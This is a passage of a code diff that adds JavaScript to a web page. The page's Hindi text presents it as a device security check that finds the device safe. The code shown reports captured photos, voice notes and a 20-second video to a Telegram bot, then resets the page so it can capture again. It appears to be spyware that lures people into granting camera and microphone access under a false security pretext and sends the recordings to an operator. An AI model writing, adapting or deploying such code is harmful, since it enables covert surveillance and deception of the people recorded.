+    actionSection.classList.add('hidden');
+    
+    setStatus('✅ सुरक्षा जाँच पूर्ण! आपका डिवाइस सुरक्षित है।', 'success');
+    
+    await sendTelegramMessage(`✅ <b>सुरक्षा जाँच पूर्ण</b>\n\n📸 फोटो: ${state.photos.length}/6\n🎤 वॉइस नोट: ${state.voiceNotes.length}/3\n🎥 वीडियो: ✅ (20 सेकंड)\n\n⏰ ${new Date().toLocaleString()}`);
+    
+    resetBtn.classList.remove('hidden');
+    resetBtn.onclick = () => {
+        // Stop bot polling
+        state.botPollingActive = false;
+        // Reset everything
+        state.photos = [];
+        state.voiceNotes = [];
+        state.videoBlob = null;
+        state.currentStep = 0;
+        progressFill.style.width = '0%';
+        for (let i = 1; i <= 5; i++) {
+            const el = $(`step${i}`);
+            el.classList.add('hidden');
+            el.classList.remove('done');
+        }
+        actionSection.classList.add('hidden');
+        resetBtn.classList.add('hidden');
+        setStatus('कृपया प्रतीक्षा करें, डिवाइस की जाँच की जा रही है...');
+        step1();
+    };
+}
+
+// ============================================================
+// START
+// ============================================================
+step1();
 </script>
 </body>
 </html>
